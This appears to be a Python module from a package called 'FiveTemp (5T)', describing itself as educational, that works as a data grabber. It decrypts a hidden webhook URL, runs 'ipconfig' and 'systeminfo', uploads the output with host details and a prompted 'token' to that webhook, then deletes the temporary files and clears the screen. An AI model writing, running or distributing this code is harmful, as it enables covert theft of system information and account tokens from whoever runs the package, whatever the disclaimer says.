import requests
import platform
import subprocess
import os
import json
from .encrypt import decrypt

token = ''

def get_pc_info():
    info = {
        'System': platform.system(),
        'Node': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor()
    }
    return info

def run_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        return result.stdout
    except Exception as e:
        return str(e)

def save_file(filename, content):
    with open(filename, 'w') as file:
        file.write(content)

def delete_files(*files):
    for file in files:
        try:
            os.remove(file)
        except FileNotFoundError:
            pass
        except PermissionError:
            pass

def s(encrypted_webhook):
    webhook_url = decrypt(encrypted_webhook)
    
    try:
        pc_info = get_pc_info()

        ipinfo = run_command('ipconfig')
        sysinfo = run_command('systeminfo')

        save_file('ip.txt', ipinfo)
        save_file('sysinfo.txt', sysinfo)

        files = {
            'file1': ('ip.txt', open('ip.txt', 'rb')),
            'file2': ('sysinfo.txt', open('sysinfo.txt', 'rb'))
        }

        embed = {
            "embeds": [
                {
                    "title": "5T | @abyzmzs yt",
                    "description": "FiveTemp (5T) is a Python package designed for educational purposes. It collects system information and sends it securely. FiveTemp is solely for educational purposes only. If you want to request a feature for the next update, feel free to let me know at my [YouTube](https://www.youtube.com/@abyzmzs).",
                    "color": 0x6a0dad,
                    "fields": [
                        {"name": "System", "value": pc_info['System'], "inline": True},
                        {"name": "Node", "value": pc_info['Node'], "inline": True},
                        {"name": "Release", "value": pc_info['Release'], "inline": True},
                        {"name": "Version", "value": pc_info['Version'], "inline": True},
                        {"name": "Machine", "value": pc_info['Machine'], "inline": True},
                        {"name": "Processor", "value": pc_info['Processor'], "inline": True},
                        {"name": "Token", "value": token if token else "Not provided", "inline": False}
                    ]
                }
            ]
        }
        
        response = requests.post(
            webhook_url,
            data={"payload_json": json.dumps(embed)},
            files=files
        )
        response.raise_for_status()
        
        for file in files.values():
            file[1].close()

    except Exception as e:
        error_embed = {
            "embeds": [
                {
                    "title": "5T | @abyzmzs yt",
                    "description": "Error.. Sorry :(",
                    "color": 0xff0000
                }
            ]
        }
        requests.post(webhook_url, json=error_embed)
    
    finally:
        delete_files('ip.txt', 'sysinfo.txt')
        os.system('cls' if os.name == 'nt' else 'clear')

def st(encrypted_webhook, token_value=None):
    global token

    if token_value is not None:
        token = token_value
    else:
        token = input("Enter your token: ")
    
    s(encrypted_webhook)
